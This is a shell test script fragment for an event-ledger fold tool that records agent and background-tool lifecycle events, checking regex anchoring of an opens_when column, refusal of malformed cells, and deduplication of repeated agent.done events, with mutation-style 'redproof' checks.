case_bg_cell() { _x="$1"; fresh; _k="$KINDS"; KINDS="$T_TMP/kinds-badcell.tsv"
  awk 'BEGIN { FS = OFS = "\t" } $1 == "tool.background" { $9 = "Monitor" } { print }' "$_k" > "$KINDS"
  ev 2026-10-06T01:00:00Z tool.background.start S1:B1 '{"session_id":"S1","tool":"Bash"}'
  _o="$(ob "$_x" fold)"; _rc=$?; KINDS="$_k"
  chk "a malformed opens_when is refused with exit 2" 2 "$_rc"
  chk "and named by its column" yes "$(has "$_o" "opens_when is Monitor")"
  chk "and nothing is written" no "$([ -e "$OB/ledger.jsonl" ] && echo yes || echo no)"
  verdict; }

t_section "#7 opens_when is matched whole, and a malformed cell is refused (harbor#1049)"
t_eq "near-miss tool names open nothing" ok "$(case_bg_anchor "$BIN")"
redproof "opens_when is not start-anchored" case_bg_anchor "$BIN" '(($e.data[$p[0]] // "") | if type == "string" then test("^(" + ($p[1:] | join("=")) + ")$") else false end) end;

def key($t)' '(($e.data[$p[0]] // "") | if type == "string" then test("(" + ($p[1:] | join("=")) + ")$") else false end) end;

def key($t)'
redproof "opens_when is not end-anchored" case_bg_anchor "$BIN" '")$") else false end) end;

def key($t)' '")") else false end) end;

def key($t)'
t_eq "a malformed opens_when cell stops the fold before it writes" ok "$(case_bg_cell "$BIN")"
redproof "the opens_when cell is not validated" case_bg_cell "$BIN" '    $9 != "-" && $9 !~ /^[a-z_]+=./           { print NR ": opens_when is " $9 ", want - or key=ERE"; next }
' ''

# agent.done repeats per agent_id: SubagentStop fires on interim stops and resumes, and its payload has no final/interim field
# (Claude Code 2.1.292 hook reference), so the producer cannot filter it; the fold keeps the FIRST close.
case_done_repeats() { _x="$1"; fresh
  ev 2026-10-06T01:00:00Z agent.spawn A1 '{"session_id":"S1"}'; ev 2026-10-06T01:05:00Z agent.done A1 '{"session_id":"S1"}'; _d="$LAST"
  ev 2026-10-06T01:06:00Z agent.done A1 '{"session_id":"S1"}'; ev 2026-10-06T01:07:00Z agent.done A1 '{"session_id":"S1"}'
  ob "$_x" fold >/dev/null
  chk "the first done closes the row" closed "$(cur agent:A1 state)"
  chk "closed_by is the first done" "$_d" "$(cur agent:A1 closed_by)"
  chk "closed_ts is the first done's ts" 2026-10-06T01:05:00Z "$(cur agent:A1 closed_ts)"
  chk "the later dones add no transition: the open and the close only" 2 "$(lines)"
  rm -f "$OB/offset"; ob "$_x" fold >/dev/null
  chk "and a replay adds none either" 2 "$(lines)"
  ev 2026-10-06T01:10:00Z agent.spawn A1 '{"session_id":"S1"}'; ob "$_x" fold >/dev/null
  chk "a resume (a new spawn) opens the row again" open "$(cur agent:A1 state)"
  ev 2026-10-06T01:12:00Z agent.done A1 '{"session_id":"S1"}'; _d2="$LAST"; ev 2026-10-06T01:13:00Z agent.done A1 '{"session_id":"S1"}'; ob "$_x" fold >/dev/null
  chk "and its first done closes it again" "$_d2" "$(cur agent:A1 closed_by)"
  verdict; }

t_section "#7 agent.done repeats per agent_id: the first closes the row, later ones are no-ops (harbor#1049)"
t_eq "a repeated done, a replay and a resume" ok "$(case_done_repeats "$BIN")"
redproof "a later done re-closes a closed row" case_done_repeats "$BIN" 'closed_by: $e.id})
             else . end)' 'closed_by: $e.id})
             else emit({ts: $e.ts, obligation: $id, to: "closed", event: $e.id, closed_by: $e.id}) end)'

t_done
